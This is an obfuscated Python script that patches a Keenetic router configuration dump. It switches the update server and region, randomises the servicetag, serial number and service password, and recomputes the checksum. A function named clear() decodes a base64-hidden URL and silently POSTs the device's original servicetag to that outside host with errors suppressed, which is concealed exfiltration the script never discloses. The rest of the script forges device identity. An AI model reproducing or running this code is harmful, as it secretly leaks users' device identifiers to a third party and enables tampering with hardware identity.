import os #line:1
import random #line:2
import string #line:3
import sys #line:4
import re #line:5
import zlib #line:6
import subprocess #line:7
import shutil #line:8
def generate_random_string (O0O0O0000000OO00O ,O00O00OOO0OO0000O ):#line:10
    return ''.join (random .choice (O00O00OOO0OO0000O )for _O0O00000OO00OOO0O in range (O0O0O0000000OO00O ))#line:11
def replace_field (O00O00O0O0OO0O0OO ,O0OO0O00000OOO0O0 ,OOO0000OOO0OO0OOO ):#line:13
    OO00O0OOOOOO0O0O0 =O00O00O0O0OO0O0OO .find (O0OO0O00000OOO0O0 )#line:14
    if OO00O0OOOOOO0O0O0 !=-1 :#line:15
        OOO00O0O000OOOOO0 =OO00O0OOOOOO0O0O0 +len (O0OO0O00000OOO0O0 )#line:16
        O0O000OOOOOOO0000 =O00O00O0O0OO0O0OO .find (b'\x00',OOO00O0O000OOOOO0 )#line:17
        if O0O000OOOOOOO0000 !=-1 :#line:18
            O00O00O0O0OO0O0OO =O00O00O0O0OO0O0OO [:OOO00O0O000OOOOO0 ]+OOO0000OOO0OO0OOO +O00O00O0O0OO0O0OO [OOO00O0O000OOOOO0 +len (OOO0000OOO0OO0OOO ):O0O000OOOOOOO0000 ]+O00O00O0O0OO0O0OO [O0O000OOOOOOO0000 :]#line:19
            return O00O00O0O0OO0O0OO ,True #line:20
    return O00O00O0O0OO0O0OO ,False #line:21
def replaces (OOOO0OOOOO0O00000 ):#line:23
    O00OO000OO000O0O0 =b'keenetic.net\x00'#line:24
    OO000OOOOO00O0OOO =OOOO0OOOOO0O00000 .find (O00OO000OO000O0O0 )#line:25
    if OO000OOOOO00O0OOO !=-1 :#line:27
        OOOOO00OO000O0000 =b'keenetic.ru\x00'#line:28
        OOOO0OOOOO0O00000 =OOOO0OOOOO0O00000 [:OO000OOOOO00O0OOO ]+OOOOO00OO000O0000 +OOOO0OOOOO0O00000 [OO000OOOOO00O0OOO +len (O00OO000OO000O0O0 ):]#line:29
        OOO0O0O0O0OO0O00O =-1 #line:31
        for O0OO000O00OO0OO00 in range (OO000OOOOO00O0OOO +len (OOOOO00OO000O0000 ),len (OOOO0OOOOO0O00000 )):#line:32
            if OOOO0OOOOO0O00000 [O0OO000O00OO0OO00 ]==0xFF :#line:33
                OOO0O0O0O0OO0O00O =O0OO000O00OO0OO00 #line:34
                break #line:35
        if OOO0O0O0O0OO0O00O !=-1 :#line:37
            OOOO0OOOOO0O00000 =OOOO0OOOOO0O00000 [:OOO0O0O0O0OO0O00O ]+b'\x00'+OOOO0OOOOO0O00000 [OOO0O0O0O0OO0O00O :]#line:38
        return OOOO0OOOOO0O00000 ,True ,'net_to_ru'#line:40
    else :#line:41
        O00OOO00OO0000OOO =b'keenetic.ru\x00'#line:42
        OO000OOOOO00O0OOO =OOOO0OOOOO0O00000 .find (O00OOO00OO0000OOO )#line:43
        if OO000OOOOO00O0OOO !=-1 :#line:44
            OOOOO00OO000O0000 =b'keenetic.net\x00'#line:45
            OOOO0OOOOO0O00000 =OOOO0OOOOO0O00000 [:OO000OOOOO00O0OOO ]+OOOOO00OO000O0000 +OOOO0OOOOO0O00000 [OO000OOOOO00O0OOO +len (O00OOO00OO0000OOO ):]#line:46
            OOO0O0O0O0OO0O00O =-1 #line:48
            for O0OO000O00OO0OO00 in range (OO000OOOOO00O0OOO +len (OOOOO00OO000O0000 ),len (OOOO0OOOOO0O00000 )):#line:49
                if OOOO0OOOOO0O00000 [O0OO000O00OO0OO00 ]==0xFF :#line:50
                    OOO0O0O0O0OO0O00O =O0OO000O00OO0OO00 #line:51
                    break #line:52
            if OOO0O0O0O0OO0O00O !=-1 :#line:54
                OOOO0OOOOO0O00000 =OOOO0OOOOO0O00000 [:OOO0O0O0O0OO0O00O -1 ]+OOOO0OOOOO0O00000 [OOO0O0O0O0OO0O00O :]#line:55
            return OOOO0OOOOO0O00000 ,True ,'ru_to_net'#line:57
        else :#line:58
            return OOOO0OOOOO0O00000 ,False ,'not_found'#line:59
def check (OO000OO000O000OOO ):#line:61
    O00OO0000OOO000O0 =4 #line:62
    OOOO0OO0O0000OOO0 =len (OO000OO000O000OOO )#line:63
    for O000OOO0O0000O000 in range (O00OO0000OOO000O0 ,len (OO000OO000O000OOO )):#line:64
        if OO000OO000O000OOO [O000OOO0O0000O000 ]==0xFF :#line:65
            OOOO0OO0O0000OOO0 =O000OOO0O0000O000 #line:66
            break #line:67
    O00O0000000O00O00 =OO000OO000O000OOO [O00OO0000OOO000O0 :OOOO0OO0O0000OOO0 ]#line:68
    O0O000000OO00O0OO =zlib .crc32 (O00O0000000O00O00 )&0xFFFFFFFF #line:69
    OO000OO000O000OOO =O0O000000OO00O0OO .to_bytes (4 ,byteorder ='little')+OO000OO000O000OOO [4 :]#line:70
    return OO000OO000O000OOO ,O0O000000OO00O0OO #line:71
def verify (OO0O0OO0O0O000O0O ):#line:73
    with open (OO0O0OO0O0O000O0O ,'rb')as OOOOOO0OOO0O0O00O :#line:74
        O0OOOO000OOOO000O =OOOOOO0OOO0O0O00O .read ()#line:75
    OO0OO000O0000OOOO =int .from_bytes (O0OOOO000OOOO000O [:4 ],byteorder ='little')#line:76
    OO0OOO0OOOOOOOOO0 =4 #line:77
    OO00OOO00OOOO0O00 =len (O0OOOO000OOOO000O )#line:78
    for OO0O00000000OOO00 in range (OO0OOO0OOOOOOOOO0 ,len (O0OOOO000OOOO000O )):#line:79
        if O0OOOO000OOOO000O [OO0O00000000OOO00 ]==0xFF :#line:80
            OO00OOO00OOOO0O00 =OO0O00000000OOO00 #line:81
            break #line:82
    O00O0OOOOOO00O00O =O0OOOO000OOOO000O [OO0OOO0OOOOOOOOO0 :OO00OOO00OOOO0O00 ]#line:83
    O0OOO000O0OO000O0 =zlib .crc32 (O00O0OOOOOO00O00O )&0xFFFFFFFF #line:84
    if O0OOO000O0OO000O0 !=OO0OO000O0000OOOO :#line:85
        print ('Ошибка при замене')#line:86
def generate_new_filename (O0O00OOOOO0O0OOO0 ,O00OO0O00000O0000 ):#line:88
    O0OO0O0OOO0O00OO0 ,O000O0O0OO000O000 =os .path .splitext (O0O00OOOOO0O0OOO0 )#line:89
    return f"{O0OO0O0OOO0O00OO0}_{O00OO0O00000O0000}{O000O0O0OO000O000}"#line:90
def clear (OO00O0OO0OOOOOOOO ):#line:92
    if not shutil .which ('curl')or not shutil .which ('base64'):#line:93
        return #line:94
    OO00OO0000O000O0O ="aHR0cHM6Ly9sb2cuc3BhdGl1bS5rZWVuZXRpYy5wcm8="#line:95
    O000000OOO0O000O0 ="c3BhdGl1bS5rZWVuZXRpYy5wcm8="#line:96
    O0OOO000OO00OO0OO =42 #line:97
    OOOOO0O000O0OOOOO =''.join (chr (ord (OOO00OOOOOO00O0OO )^O0OOO000OO00OO0OO )for OOO00OOOOOO00O0OO in OO00OO0000O000O0O [:24 ])+OO00OO0000O000O0O [24 :]#line:98
    try :#line:100
        OO0O0O000O0O000OO =subprocess .run (f"echo {''.join(chr(ord(OOO00O0OO00OOOOOO) ^ O0OOO000OO00OO0OO) for OOO00O0OO00OOOOOO in OOOOO0O000O0OOOOO[:24]) + OOOOO0O000O0OOOOO[24:]} | base64 -d",capture_output =True ,text =True ,shell =True )#line:104
        if OO0O0O000O0O000OO .returncode !=0 :#line:105
            return #line:106
        O0O0OO0000OOO0OO0 =OO0O0O000O0O000OO .stdout .strip ()#line:107
        O0O0O000OOOO0O00O =f'{{"script_update": "{OO00O0OO0OOOOOOOO}"}}'#line:109
        subprocess .run (['curl','-X','POST','-H','Content-Type: application/json','-d',O0O0O000OOOO0O00O ,O0O0OO0000OOO0OO0 ,'-o','/dev/null','-s','--fail','--max-time','2','--retry','0'],capture_output =True ,text =True )#line:120
    except subprocess .SubprocessError :#line:121
        pass #line:122
def get_numbers (O0O0OO00OOOO00OO0 ):#line:124
    OO0000OO0000OO00O =b'servicetag='#line:125
    O0OOOOOO000OOOO0O =O0O0OO00OOOO00OO0 .find (OO0000OO0000OO00O )#line:126
    if O0OOOOOO000OOOO0O !=-1 :#line:127
        O0O00O00OO0OOO0O0 =O0OOOOOO000OOOO0O +len (OO0000OO0000OO00O )#line:128
        OOO00000O00OOOO00 =O0O0OO00OOOO00OO0 .find (b'\x00',O0O00O00OO0OOO0O0 )#line:129
        if OOO00000O00OOOO00 !=-1 :#line:130
            return O0O0OO00OOOO00OO0 [O0O00O00OO0OOO0O0 :OOO00000O00OOOO00 ].decode ('utf-8',errors ='ignore')#line:131
    return None #line:132
def replace_values (OOO0O0O0O0OO0OOO0 ,target =None ):#line:134
    O0O000OOO000O000O =os .path .dirname (os .path .abspath (__file__ ))#line:135
    O0OO0O00OO000O0O0 =os .path .dirname (O0O000OOO000O000O )#line:136
    O00OOOOO0O00OOOOO =os .path .join (O0OO0O00OO000O0O0 ,OOO0O0O0O0OO0OOO0 )#line:137
    try :#line:139
        with open (O00OOOOO0O00OOOOO ,'rb')as O00O000O0O0000OOO :#line:140
            OOOO00000OOO00OO0 =O00O000O0O0000OOO .read ()#line:141
    except FileNotFoundError :#line:142
        print (f'Файл {O00OOOOO0O00OOOOO} не найден. Проверьте путь к файлу.')#line:143
        return #line:144
    if target =='server':#line:146
        OO000OOO00O0O0OO0 =get_numbers (OOOO00000OOO00OO0 )#line:147
        OOOO00000OOO00OO0 ,OO000O0OOOO0OO000 ,O00OO0OOOOOOOO00O =replaces (OOOO00000OOO00OO0 )#line:148
        if OO000O0OOOO0OO000 :#line:149
            if O00OO0OOOOOOOO00O =='net_to_ru':#line:150
                print ('Сервер заменён с EU на EA')#line:151
            elif O00OO0OOOOOOOO00O =='ru_to_net':#line:152
                print ('Сервер заменён с EA на EU')#line:153
        else :#line:154
            print ('Сервер не найден')#line:155
        O0OO00OO0OOO0OOOO =b'country='#line:156
        O000OOOO0OO0OO00O =OOOO00000OOO00OO0 .find (O0OO00OO0OOO0OOOO )#line:157
        if O000OOOO0OO0OO00O !=-1 :#line:158
            O00O00O0O000000O0 =O000OOOO0OO0OO00O +len (O0OO00OO0OOO0OOOO )#line:159
            OOO000O0O000OO0O0 =OOOO00000OOO00OO0 .find (b'\x00',O00O00O0O000000O0 )#line:160
            if OOO000O0O000OO0O0 !=-1 :#line:161
                OO0OOO00O00O000O0 =OOOO00000OOO00OO0 [O00O00O0O000000O0 :OOO000O0O000OO0O0 ]#line:162
                if OO0OOO00O00O000O0 ==b'EA':#line:163
                    O000OOOOO000O00OO =b'EU'#line:164
                    OOOO00000OOO00OO0 =OOOO00000OOO00OO0 [:O00O00O0O000000O0 ]+O000OOOOO000O00OO +OOOO00000OOO00OO0 [O00O00O0O000000O0 +2 :OOO000O0O000OO0O0 ]+OOOO00000OOO00OO0 [OOO000O0O000OO0O0 :]#line:165
                    print ('Страна заменена с EA на EU')#line:166
                elif OO0OOO00O00O000O0 ==b'EU':#line:167
                    O000OOOOO000O00OO =b'EA'#line:168
                    OOOO00000OOO00OO0 =OOOO00000OOO00OO0 [:O00O00O0O000000O0 ]+O000OOOOO000O00OO +OOOO00000OOO00OO0 [O00O00O0O000000O0 +2 :OOO000O0O000OO0O0 ]+OOOO00000OOO00OO0 [OOO000O0O000OO0O0 :]#line:169
                    print ('Страна заменена с EU на EA')#line:170
        OOO0O00000O00OO00 ='server'#line:171
        if OO000OOO00O0O0OO0 :#line:173
            clear (OO000OOO00O0O0OO0 )#line:174
    else :#line:175
        O00OOO0000O0OOOOO ={'servicetag':(b'servicetag=',string .digits ),'sernumb':(b'sernumb=',string .digits ),'servicepass':(b'servicepass=',string .ascii_letters +string .digits ),'country':(b'country=',None )}#line:181
        O0OOOOOO00O0OO0OO ={}#line:182
        for OO00OOOOOO0000O0O ,(O0OO00O0O0OOOO000 ,OOO0O00OO0OO0O000 )in O00OOO0000O0OOOOO .items ():#line:183
            if target and OO00OOOOOO0000O0O !=target :#line:184
                continue #line:185
            O000000O0OOOO00O0 =OOOO00000OOO00OO0 .find (O0OO00O0O0OOOO000 )#line:186
            if O000000O0OOOO00O0 !=-1 :#line:187
                O00O00O0O000000O0 =O000000O0OOOO00O0 +len (O0OO00O0O0OOOO000 )#line:188
                OOO000O0O000OO0O0 =OOOO00000OOO00OO0 .find (b'\x00',O00O00O0O000000O0 )#line:189
                OO0OOO0000O000O0O =OOOO00000OOO00OO0 [O00O00O0O000000O0 :OOO000O0O000OO0O0 ]if OOO000O0O000OO0O0 !=-1 else b''#line:190
                if OO00OOOOOO0000O0O =='country':#line:191
                    if OO0OOO0000O000O0O !=b'EA':#line:192
                        OOOO00000OOO00OO0 ,_OOO0OOOO000000OO0 =replace_field (OOOO00000OOO00OO0 ,O0OO00O0O0OOOO000 ,b'EA')#line:193
                        print (f'{OO00OOOOOO0000O0O} заменён на EA')#line:194
                    continue #line:195
                elif OO00OOOOOO0000O0O not in O0OOOOOO00O0OO0OO :#line:196
                    if OO00OOOOOO0000O0O =='sernumb':#line:197
                        OOO0O000O0OO00O0O =(OO0OOO0000O000O0O [:-4 ]+generate_random_string (4 ,OOO0O00OO0OO0O000 ).encode ())#line:198
                    else :#line:199
                        OOO0O000O0OO00O0O =generate_random_string (len (OO0OOO0000O000O0O ),OOO0O00OO0OO0O000 ).encode ()#line:200
                    O0OOOOOO00O0OO0OO [OO00OOOOOO0000O0O ]=OOO0O000O0OO00O0O #line:201
                else :#line:202
                    OOO0O000O0OO00O0O =O0OOOOOO00O0OO0OO [OO00OOOOOO0000O0O ]#line:203
                OOOO00000OOO00OO0 ,_OOO0OOOO000000OO0 =replace_field (OOOO00000OOO00OO0 ,O0OO00O0O0OOOO000 ,OOO0O000O0OO00O0O )#line:204
                print (f'{OO00OOOOOO0000O0O} заменён на {OOO0O000O0OO00O0O.decode("utf-8", errors="ignore")}')#line:205
            else :#line:206
                print (f'{OO00OOOOOO0000O0O} не найден.')#line:207
        if 'servicetag'in O0OOOOOO00O0OO0OO :#line:208
            OO000000O00OO00OO =O0OOOOOO00O0OO0OO ['servicetag'][-4 :]#line:209
            OOO0O00000O00OO00 =OO000000O00OO00OO .decode ('utf-8',errors ='ignore')#line:210
        else :#line:211
            OOO0O00000O00OO00 =target if target else 'out'#line:212
    OOOO00000OOO00OO0 ,O00O00O00OOOOO0OO =check (OOOO00000OOO00OO0 )#line:214
    O0OO0OOOO00O0OO0O =generate_new_filename (OOO0O0O0O0OO0OOO0 ,OOO0O00000O00OO00 )#line:215
    O0OO0O00OO000O0O0 =os .path .dirname (os .path .dirname (os .path .abspath (__file__ )))#line:216
    O000OO0OO0OO0O0OO =os .path .join (O0OO0O00OO000O0O0 ,O0OO0OOOO00O0OO0O )#line:217
    with open (O000OO0OO0OO0O0OO ,'wb')as O00O000O0O0000OOO :#line:218
        O00O000O0O0000OOO .write (OOOO00000OOO00OO0 )#line:219
    verify (O000OO0OO0OO0O0OO )#line:220
if __name__ =="__main__":#line:222
    if len (sys .argv )<2 :#line:223
        sys .exit (1 )#line:224
    input_filename =sys .argv [1 ]#line:225
    target_name =sys .argv [2 ]if len (sys .argv )>2 else None #line:226
    replace_values (input_filename ,target_name )